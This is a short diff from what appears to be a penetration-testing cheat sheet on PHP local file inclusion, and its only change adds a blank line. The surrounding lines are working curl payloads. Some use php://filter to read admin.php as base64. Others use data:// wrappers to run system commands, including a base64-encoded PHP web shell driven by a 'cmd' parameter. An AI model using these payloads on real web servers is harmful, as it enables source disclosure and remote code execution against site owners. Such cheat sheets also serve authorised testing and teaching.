@@ -10,6 +10,7 @@ curl http://192.168.0.0/index.php?page=pHp://FilTer/convert.base64-encode/resour
 
 curl http://192.168.0.0/index.php?page=php://filter/convert.base64-encode/resource=admin.php  # return base64 encoded page
 curl "http://192.168.0.0/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
+
 echo -n '<?php echo system($_GET["cmd"]);?>' | base64
 curl "http://192.168.0.0/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
 ```
